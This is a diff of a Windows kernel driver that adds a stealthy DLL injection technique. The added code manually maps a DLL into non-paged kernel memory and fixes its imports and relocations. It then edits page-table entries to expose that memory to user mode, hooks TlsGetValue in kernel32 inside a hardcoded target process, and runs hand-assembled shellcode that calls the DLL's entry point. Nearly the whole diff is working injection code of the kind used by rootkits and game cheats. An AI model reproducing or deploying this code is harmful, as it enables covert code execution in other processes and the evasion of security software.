@@ -3,11 +3,15 @@
 #include <ntimage.h>
 #include <ntstrsafe.h>
 
+#define DLLPATH  L"\\??\\C:\\Users\\yongcai\\Desktop\\Ycix64.dll"
+
 NTKERNELAPI PPEB NTAPI PsGetProcessPeb(IN PEPROCESS Process);
 NTKERNELAPI PPEB NTAPI PsGetProcessWow64Process(PEPROCESS Process);
 
+ULONG64 g_oep = 0;
 PVOID g_shellCode = NULL;
-ULONG g_injectPid = 2100;
+ULONG g_injectPid = 7892;
+ULONG g_allocateSize = 0;
 
 typedef struct _PEB32 {
 	UCHAR InheritedAddressSpace;
@@ -229,6 +233,19 @@ PVOID GetModuleExport(IN PVOID ModuleBase, IN PCCHAR FunctionName)
 			if (((ULONG_PTR)FunctionName <= 0xFFFF && (USHORT)((ULONG_PTR)FunctionName) == OrdIndex + ImageExportDirectory->Base) ||
 				((ULONG_PTR)FunctionName > 0xFFFF && strcmp(pName, FunctionName) == 0))
 			{
+				PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)ImageNtHeaders64 + sizeof(ImageNtHeaders64->Signature) + sizeof(ImageNtHeaders64->FileHeader) + ImageNtHeaders64->FileHeader.SizeOfOptionalHeader);
+				for (int j = 0; j < ImageNtHeaders64->FileHeader.NumberOfSections; j++)
+				{
+					if (memcmp(".text", pSectionHeader->Name, strlen(".text") + 1) == 0)
+					{
+						if (pAddressOfFuncs[OrdIndex] > pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)
+						{
+							return (PVOID)pAddressOfFuncs[OrdIndex];
+						}
+					}
+					pSectionHeader++;
+				}
+
 				FunctionAddress = pAddressOfFuncs[OrdIndex] + (ULONG_PTR)ModuleBase;
 				break;
 			}
@@ -349,56 +366,197 @@ ULONG64 MiGetXXXAddress(ULONG64 VirtualAddress, PVOID PteBase) {
 	return ((VirtualAddress >> 9) & 0x7FFFFFFFF8) + (ULONG64)PteBase;
 }
 
-VOID allocateMem()
+VOID Modify2UserMem()
 {
-	g_shellCode = ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'Yci');
-	if (g_shellCode)
+	if (g_shellCode && g_allocateSize)
 	{
 		PULONG64 PteBase = (PULONG64)GetPTEBase();
 		if (PteBase)
 		{
-			PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode, PteBase);
-			PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
-			PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
-			PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);
-
-			if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
+			for (ULONG i = 0; i < g_allocateSize / PAGE_SIZE; i++)
 			{
-				*Pte |= 4;
-				*Pde |= 4;
-				*Ppe |= 4;
-				*Pxe |= 4;
+				PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode + (ULONG64)i * PAGE_SIZE, PteBase);
+				PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
+				PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
+				PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);
+				if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
+				{
+					*Pte |= 4;
+					*Pde |= 4;
+					*Ppe |= 4;
+					*Pxe |= 4;
+				}
 			}
 		}
 	}
 }
 
-VOID freeMem(ULONG pid)
+VOID Modify2KernelMem()
 {
-	PEPROCESS pEprocess = NULL;
-	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)pid, &pEprocess)))
+	if (g_shellCode && g_allocateSize)
 	{
-		KAPC_STATE kApc = { 0 };
-		KeStackAttachProcess(pEprocess, &kApc);
-		PULONG64 PteBase = (PULONG64)GetPTEBase();
-		if (PteBase)
+		PEPROCESS pEprocess = NULL;
+		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)g_injectPid, &pEprocess)))
 		{
-			PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode, PteBase);
-			PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
-			PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
-			PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);
-
-			if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
+			KAPC_STATE kApc = { 0 };
+			KeStackAttachProcess(pEprocess, &kApc);
+			PULONG64 PteBase = (PULONG64)GetPTEBase();
+			if (PteBase)
 			{
-				*Pte &= 0xfffffffffffffffb;
-				*Pde &= 0xfffffffffffffffb;
-				*Ppe &= 0xfffffffffffffffb;
-				*Pxe &= 0xfffffffffffffffb;
+				for (ULONG i = 0; i < g_allocateSize / PAGE_SIZE; i++)
+				{
+					PULONG64 Pte = (PULONG64)MiGetXXXAddress((ULONG64)g_shellCode + (ULONG64)i * PAGE_SIZE, PteBase);
+					PULONG64 Pde = (PULONG64)MiGetXXXAddress((ULONG64)Pte, PteBase);
+					PULONG64 Ppe = (PULONG64)MiGetXXXAddress((ULONG64)Pde, PteBase);
+					PULONG64 Pxe = (PULONG64)MiGetXXXAddress((ULONG64)Ppe, PteBase);
+
+					if (MmIsAddressValid(Pte) && MmIsAddressValid(Pde) && MmIsAddressValid(Ppe) && MmIsAddressValid(Pxe))
+					{
+						*Pte &= 0xfffffffffffffffb;
+						*Pde &= 0xfffffffffffffffb;
+						*Ppe &= 0xfffffffffffffffb;
+						*Pxe &= 0xfffffffffffffffb;
+					}
+				}
 			}
+			KeUnstackDetachProcess(&kApc);
+			ObDereferenceObject(pEprocess);
 		}
-		KeUnstackDetachProcess(&kApc);
-		ObDereferenceObject(pEprocess);
 	}
+}
+
+NTSTATUS MapDLLAndFixIAT(IN PEPROCESS EProcess)
+{
+	NTSTATUS Status;
+	HANDLE FileHandle;
+	IO_STATUS_BLOCK ioStatus;
+	UNICODE_STRING uniFileName;
+	FILE_STANDARD_INFORMATION FileInformation;
+	RtlInitUnicodeString(&uniFileName, DLLPATH);
+
+	OBJECT_ATTRIBUTES objectAttributes;
+	InitializeObjectAttributes(&objectAttributes, &uniFileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
+
+	Status = IoCreateFile(&FileHandle, FILE_READ_ATTRIBUTES | SYNCHRONIZE, &objectAttributes, &ioStatus, 0, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
+	if (!NT_SUCCESS(Status))
+		return Status;
+
+	Status = ZwQueryInformationFile(FileHandle, &ioStatus, &FileInformation, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
+	if (!NT_SUCCESS(Status))
+	{
+		ZwClose(FileHandle);
+		return Status;
+	}
+
+	if (FileInformation.EndOfFile.HighPart != 0)
+	{
+		ZwClose(FileHandle);
+		return Status;
+	}
+
+	ULONG64 uFileSize = FileInformation.EndOfFile.LowPart;
+	PVOID pBuffer = ExAllocatePoolWithTag(PagedPool, uFileSize + PAGE_SIZE, 'YC');
+	if (pBuffer == NULL)
+	{
+		ZwClose(FileHandle);
+		return Status;
+	}
+
+	LARGE_INTEGER byteOffset = { 0 };
+	Status = ZwReadFile(FileHandle, NULL, NULL, NULL, &ioStatus, pBuffer, (ULONG)uFileSize, &byteOffset, NULL);
+	if (!NT_SUCCESS(Status))
+	{
+		ZwClose(FileHandle);
+		return Status;
+	}
+
+	PIMAGE_DOS_HEADER ImageDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
+	if (ImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
+	{
+		return STATUS_UNSUCCESSFUL;
+	}
+	PIMAGE_NT_HEADERS64 pImageNtHeaders64 = (PIMAGE_NT_HEADERS64)((PUCHAR)pBuffer + ImageDosHeader->e_lfanew);
+	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((PUCHAR)pImageNtHeaders64 + sizeof(pImageNtHeaders64->Signature) + sizeof(pImageNtHeaders64->FileHeader) + pImageNtHeaders64->FileHeader.SizeOfOptionalHeader);
+
+	g_allocateSize = pImageNtHeaders64->OptionalHeader.SizeOfImage + PAGE_SIZE;
+	g_shellCode = ExAllocatePoolWithTag(NonPagedPool, g_allocateSize, 'Yci');
+	if (g_shellCode)
+	{
+		RtlZeroMemory(g_shellCode, g_allocateSize);
+		g_shellCode = (PVOID)((ULONG64)g_shellCode + PAGE_SIZE);
+
+		memcpy(g_shellCode, pBuffer, pImageNtHeaders64->OptionalHeader.SizeOfHeaders);
+
+		for (int i = 0; i < pImageNtHeaders64->FileHeader.NumberOfSections; i++)
+		{
+			memcpy((PUCHAR)g_shellCode + pSectionHeader->VirtualAddress, (PUCHAR)pBuffer + pSectionHeader->PointerToRawData,
+				pSectionHeader->SizeOfRawData == 0 ? pSectionHeader->Misc.VirtualSize : pSectionHeader->SizeOfRawData);
+			pSectionHeader++;
+		}
+
+		PIMAGE_EXPORT_DIRECTORY pExportHeader = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+		PULONG  pAddressOfFuncs = (PULONG)(pExportHeader->AddressOfFunctions + (ULONG64)g_shellCode);
+		g_oep = (ULONG64)g_shellCode + pAddressOfFuncs[0];
+
+		PIMAGE_IMPORT_DESCRIPTOR pImportHeader = (PIMAGE_IMPORT_DESCRIPTOR)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+		while (pImportHeader->Name && pImportHeader->Characteristics)
+		{
+			WCHAR wName[0x20] = { 0 };
+			UNICODE_STRING uniDllName;
+			PCHAR name = (PCHAR)g_shellCode + pImportHeader->Name;
+			RtlStringCbPrintfW(wName, 0x20, L"%hs", name);
+			RtlInitUnicodeString(&uniDllName, wName);
+			PVOID pModuleBase = GetUserModule(EProcess, &uniDllName, FALSE);
+
+			PIMAGE_THUNK_DATA64 pImageThunkData = (PIMAGE_THUNK_DATA64)(pImportHeader->FirstThunk + (PUCHAR)g_shellCode);
+			while (pImageThunkData->u1.AddressOfData && pModuleBase)
+			{
+				if ((pImageThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG64) == 0)
+				{
+					PIMAGE_IMPORT_BY_NAME pImageImportName = (PIMAGE_IMPORT_BY_NAME)(pImageThunkData->u1.AddressOfData + (PUCHAR)g_shellCode);
+					PVOID func = GetModuleExport(pModuleBase, pImageImportName->Name);
+					if (func && func < pModuleBase)
+					{
+						if (memcmp((PUCHAR)pModuleBase + (ULONG64)func, "NTDLL", strlen("NTDLL")) == 0)//NTDLL.RtlEncodePointer
+						{
+							UNICODE_STRING Kernel32String = RTL_CONSTANT_STRING(L"Ntdll.dll");
+							PVOID NtdllAddress = GetUserModule(EProcess, &Kernel32String, FALSE);
+							func = GetModuleExport(NtdllAddress, (PCCHAR)pModuleBase + (ULONG64)func + strlen("NTDLL."));
+						}
+					}
+
+					if (func)
+						pImageThunkData->u1.Function = (ULONG64)func;
+				}
+				pImageThunkData++;
+			}
+			pImportHeader++;
+		}
+
+		ULONG64 baseAddressoffest = ((ULONG64)g_shellCode) - (pImageNtHeaders64->OptionalHeader.ImageBase);
+		PIMAGE_BASE_RELOCATION pRelocation = (PIMAGE_BASE_RELOCATION)((PUCHAR)g_shellCode + pImageNtHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+		while (pRelocation->SizeOfBlock && pRelocation->VirtualAddress)
+		{
+			ULONG iTypeOffsetCount = (ULONG)(pRelocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
+			for (ULONG i = 0; i < iTypeOffsetCount; i++)
+			{
+				USHORT TypeOffsetInfo = *(USHORT*)((PUCHAR)pRelocation + sizeof(IMAGE_BASE_RELOCATION) + i * sizeof(USHORT));
+				USHORT TypeOffsetFlag = (TypeOffsetInfo >> 12) & 0x000F;
+				if (IMAGE_REL_BASED_HIGHLOW == TypeOffsetFlag || TypeOffsetFlag == IMAGE_REL_BASED_DIR64)
+				{
+					ULONG64 relocationAddress = (ULONG64)g_shellCode + pRelocation->VirtualAddress + (TypeOffsetInfo & 0x0FFF);
+					*(PULONG64)relocationAddress += baseAddressoffest;
+				}
+			}
+			pRelocation = (PIMAGE_BASE_RELOCATION)((ULONG64)pRelocation + pRelocation->SizeOfBlock);
+		}
+
+		g_shellCode = (PVOID)((ULONG64)g_shellCode - PAGE_SIZE);
+	}
+
+	ExFreePoolWithTag(pBuffer, 'YC');
+	ZwClose(FileHandle);
+	return Status;
 }
 
 NTSTATUS InjectProcessX64(ULONG pid)
@@ -408,17 +566,18 @@ NTSTATUS InjectProcessX64(ULONG pid)
 	{
 		KAPC_STATE kApc = { 0 };
 		KeStackAttachProcess(pEprocess, &kApc);
-		//allocateMem();
+		MapDLLAndFixIAT(pEprocess);
+		Modify2UserMem();
 
 		UNICODE_STRING Kernel32String = RTL_CONSTANT_STRING(L"Kernel32.dll");
-		PVOID Kernel32Address = GetUserModule(pEprocess, &Kernel32String, PsGetProcessWow64Process(pEprocess) != 0);//
+		PVOID Kernel32Address = GetUserModule(pEprocess, &Kernel32String, FALSE);//
 		
-		if (Kernel32Address) //&& g_shellCode)
+		if (Kernel32Address && g_shellCode)
 		{
 			PVOID func = GetModuleExport(Kernel32Address, "TlsGetValue");
 			PVOID relayAddress = SearchModuleTextNop(Kernel32Address,0x28, 0);
-			PVOID shellcodeAddress = SearchModuleTextNop(Kernel32Address, 0x88 + 0x28, 0x28);
-			if (func && relayAddress && shellcodeAddress)
+			//PVOID shellcodeAddress = SearchModuleTextNop(Kernel32Address, 0x88 + 0x28, 0x28);
+			if (func && relayAddress)// && shellcodeAddress)
 			{
 				__try 
 				{
@@ -435,8 +594,8 @@ NTSTATUS InjectProcessX64(ULONG pid)
 					ULONG jneAddress = (ULONG)(tagetAddress - (ULONG64)((PUCHAR)relayAddress + 17) - 6);
 					memcpy(checkPid + 13, &pid, sizeof(ULONG));
 					memcpy(checkPid + 19, &jneAddress, sizeof(ULONG));
-					//memcpy(checkPid + 25, &g_shellCode, sizeof(ULONG64));
-					memcpy(checkPid + 25, &shellcodeAddress, sizeof(ULONG64));
+					memcpy(checkPid + 25, &g_shellCode, sizeof(ULONG64));
+					//memcpy(checkPid + 25, &shellcodeAddress, sizeof(ULONG64));
 					MapSC(checkPid, relayAddress, sizeof(checkPid));
 
 					UCHAR shellCode[] =
@@ -458,9 +617,22 @@ NTSTATUS InjectProcessX64(ULONG pid)
 						0x56,                                   // push rsi
 						0x57,                                   // push rdi
 						0x66, 0x9C,                             // pushf
-						0x48, 0x83, 0xEC, 0x26,                 // sub rsp, 0x28
-																// do nothing
-						0x48, 0x83, 0xC4, 0x26,                 // add rsp, 0x28
+						0x48, 0x83, 0xEC, 0x1E,                 // sub rsp, 0x20
+						0x48, 0xBB, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rbx,g_shellcode+0x500
+						0x48, 0x8B, 0x03,                       // mov rax,qword ptr ds:[rbx]
+						0x48, 0x83, 0xF8, 0x00,                 // cmp rax,0
+						0x75, 0x3B,							    // jne add rsp, 0x28
+						0x48, 0xB8, 1, 0, 0, 0, 0, 0, 0, 0,     // mov rax,1
+						0xF0, 0x48, 0x0F, 0xC1, 0x03,           // lock xadd qword ptr ds:[rbx],rax
+						0x48, 0x83, 0xF8, 0x00,                 // cmp rax,0
+						0x75, 0x26,							    // jne add rsp, 0x28
+						0x48, 0xB9, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rcx,hModule
+						0x48, 0xBA, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rdx,DLL_PROCESS_ATTACH
+						0x4D, 0x33, 0xC0,                       // xor r8,r8
+						0x4D, 0x33, 0xC9,                       // xor r9,r9
+						0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,     // mov rax,oep
+						0xFF, 0xD0,                             // call rax
+						0x48, 0x83, 0xC4, 0x1E,                 // add rsp, 0x20
 						0x66, 0x9D,                             // popf
 						0x5F,                                   // pop rdi
 						0x5E,                                   // pop rsi 
@@ -485,9 +657,16 @@ NTSTATUS InjectProcessX64(ULONG pid)
 						0x58,                                   // pop rax
 						0xC3                                    // ret
 					};
-					memcpy(shellCode + 64, &tagetAddress, sizeof(ULONG64));
-					//memcpy(g_shellCode, shellCode, sizeof(shellCode));
-					MapSC(shellCode, shellcodeAddress,sizeof(shellCode));
+					ULONG64 dllStats = 1;
+					ULONG64 hModule = (ULONG64)g_shellCode + PAGE_SIZE;
+					ULONG64 flagAddress = (ULONG64)g_shellCode + PAGE_SIZE/2;
+					memcpy(shellCode + 32, &flagAddress, sizeof(ULONG64));
+					memcpy(shellCode + 32 + 31 + 9, &hModule, sizeof(ULONG64));
+					memcpy(shellCode + 42 + 31 + 9, &dllStats, sizeof(ULONG64));
+					memcpy(shellCode + 58 + 31 + 9, &g_oep, sizeof(ULONG64));
+					memcpy(shellCode + 64 + 38 + 31 + 9, &tagetAddress, sizeof(ULONG64));
+					memcpy(g_shellCode, shellCode, sizeof(shellCode));
+					//MapSC(shellCode, shellcodeAddress,sizeof(shellCode));
 
 					ULONG jmpRelayAddress = (ULONG)((ULONG64)relayAddress - (ULONG64)func - 5);
 					MapSC((PUCHAR)&jmpRelayAddress, (PUCHAR)func + 1, sizeof(ULONG));
@@ -495,7 +674,6 @@ NTSTATUS InjectProcessX64(ULONG pid)
 				}__except(EXCEPTION_EXECUTE_HANDLER){}
 			}
 		}
-
 		KeUnstackDetachProcess(&kApc);
 		ObDereferenceObject(pEprocess);
 	}
@@ -508,8 +686,8 @@ NTSTATUS DriverUnload(PDRIVER_OBJECT pObj)
 
 	if (g_shellCode)
 	{
-		freeMem(g_injectPid);
-		ExFreePool(g_shellCode);
+		Modify2KernelMem();
+		ExFreePoolWithTag(g_shellCode, 'Yci');
 		g_shellCode = NULL;
 	}
 	DbgPrint("See you!\n");
